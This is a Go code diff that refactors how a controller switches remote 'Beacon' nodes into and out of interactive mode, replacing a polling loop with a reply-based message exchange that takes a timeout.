@@ -332,67 +332,51 @@ func (ctrl *Ctrl) EnableInteractiveMode(guid *guid.GUID) {
 }
 
 // EnableInteractiveModeNew is used to enable Beacon interactive mode.
-func (ctrl *Ctrl) EnableInteractiveModeNew(ctx context.Context, guid *guid.GUID) error {
-	// check already enable interactive mode
+func (ctrl *Ctrl) EnableInteractiveModeNew(
+	ctx context.Context,
+	guid *guid.GUID,
+	timeout time.Duration,
+) error {
+	// check is already enable interactive mode
 	if ctrl.sender.IsInInteractiveMode(guid) {
 		return nil
 	}
 	cm := messages.ChangeMode{Interactive: true}
-	now := ctrl.global.Now()
-	err := ctrl.sender.SendToBeacon(ctx, guid, messages.CMDBChangeMode, &cm, false)
+	reply, err := ctrl.messageMgr.SendToBeacon(ctx, guid, messages.CMDBChangeMode,
+		&cm, false, timeout)
 	if err != nil {
 		return err
 	}
-	latency := ctrl.global.Now().Sub(now)
-	// acknowledge and the response will reach together mostly
-	const interval = 50 * time.Millisecond
-	timer := time.NewTicker(interval)
-	defer timer.Stop()
-	times := 3*int(latency/interval+1) + 60
-	for i := 0; i < times; i++ {
-		if ctrl.sender.IsInInteractiveMode(guid) {
-			return nil
-		}
-		select {
-		case <-ctx.Done():
-			return ctx.Err()
-		case <-timer.C:
-		}
+	result := reply.(*messages.ChangeModeResult)
+	if result.Err != "" {
+		return errors.New(result.Err)
 	}
-	const msg = "failed to enable interactive mode: receive response timeout"
-	return errors.New(msg)
+	ctrl.sender.EnableInteractiveMode(guid)
+	return nil
 }
 
 // DisableInteractiveModeNew is used to disable Beacon interactive mode.
-func (ctrl *Ctrl) DisableInteractiveModeNew(ctx context.Context, guid *guid.GUID) error {
-	// check already disable interactive mode
+func (ctrl *Ctrl) DisableInteractiveModeNew(
+	ctx context.Context,
+	guid *guid.GUID,
+	timeout time.Duration,
+) error {
+	// check is already disable interactive mode
 	if !ctrl.sender.IsInInteractiveMode(guid) {
 		return nil
 	}
 	cm := messages.ChangeMode{Interactive: false}
-	now := ctrl.global.Now()
-	err := ctrl.sender.SendToBeacon(ctx, guid, messages.CMDBChangeMode, &cm, false)
+	reply, err := ctrl.messageMgr.SendToBeacon(ctx, guid, messages.CMDBChangeMode,
+		&cm, false, timeout)
 	if err != nil {
 		return err
 	}
-	latency := ctrl.global.Now().Sub(now)
-	// acknowledge and the response will reach together mostly
-	const interval = 50 * time.Millisecond
-	timer := time.NewTicker(interval)
-	defer timer.Stop()
-	times := 3*int(latency/interval+1) + 60
-	for i := 0; i < times; i++ {
-		if !ctrl.sender.IsInInteractiveMode(guid) {
-			return nil
-		}
-		select {
-		case <-ctx.Done():
-			return ctx.Err()
-		case <-timer.C:
-		}
+	result := reply.(*messages.ChangeModeResult)
+	if result.Err != "" {
+		return errors.New(result.Err)
 	}
-	const msg = "failed to disable interactive mode: receive response timeout"
-	return errors.New(msg)
+	ctrl.sender.DisableInteractiveMode(guid)
+	return nil
 }
 
 // DeleteNode is used to delete Node.
